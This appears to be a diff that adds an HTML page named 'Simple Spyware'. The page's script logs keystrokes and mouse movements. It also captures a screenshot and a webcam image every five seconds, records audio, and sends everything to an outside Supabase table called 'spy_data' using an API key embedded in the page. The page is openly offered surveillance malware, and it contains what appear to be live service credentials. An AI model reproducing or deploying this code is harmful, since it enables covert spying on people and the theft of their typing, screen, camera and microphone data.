@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Simple Spyware</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #222;
+      color: #fff;
+      text-align: center;
+      padding: 20px;
+    }
+    h1 {
+      color: #0f0;
+    }
+    #dashboard {
+      margin-top: 30px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Simple Spyware</h1>
+  <p>Monitoring your activity...</p>
+
+  <script>
+    // Supabase credentials
+    const supabaseUrl = 'https://muyevssqiuvhcozgxtlp.supabase.co';
+    const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
+    const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
+    // Keystroke logging
+    document.addEventListener('keydown', (e) => {
+      logData('Keystroke', e.key);
+    });
+
+    // Mouse movement tracking
+    document.addEventListener('mousemove', (e) => {
+      logData('Mouse Movement', `X: ${e.clientX}, Y: ${e.clientY}`);
+    });
+
+    // Screen capture
+    const captureScreen = async () => {
+      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+      const canvas = document.createElement('canvas');
+      const context = canvas.getContext('2d');
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      setInterval(async () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/png');
+        logData('Screenshot', imageData);
+      }, 5000);
+    };
+
+    // Webcam access
+    const captureWebcam = async () => {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      setInterval(async () => {
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL('image/png');
+        logData('Webcam', imageData);
+      }, 5000);
+    };
+
+    // Audio recording
+    const captureAudio = async () => {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      const audioContext = new AudioContext();
+      const source = audioContext.createMediaStreamSource(stream);
+      const audioDestination = audioContext.createMediaStreamDestination();
+      source.connect(audioDestination);
+
+      const audioBlob = await new Promise((resolve) => {
+        const encoder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
+        const chunks = [];
+        encoder.ondataavailable = (e) => chunks.push(e.data);
+        encoder.start();
+        setTimeout(() => {
+          encoder.stop();
+          resolve(new Blob(chunks, { type: 'audio/webm' }));
+        }, 5000);
+      });
+
+      logData('Audio', audioBlob);
+    };
+
+    // Log data to Supabase
+    async function logData(type, data) {
+      const { error } = await supabase
+        .from('spy_data')
+        .insert([
+          {
+            type: type,
+            data: data,
+            timestamp: new Date().toISOString(),
+          },
+        ]);
+
+      if (error) {
+        console.error('Error logging data:', error);
+      }
+    }
+
+    // Start all features
+    captureScreen();
+    captureWebcam();
+    captureAudio();
+  </script>
+</body>
+</html>
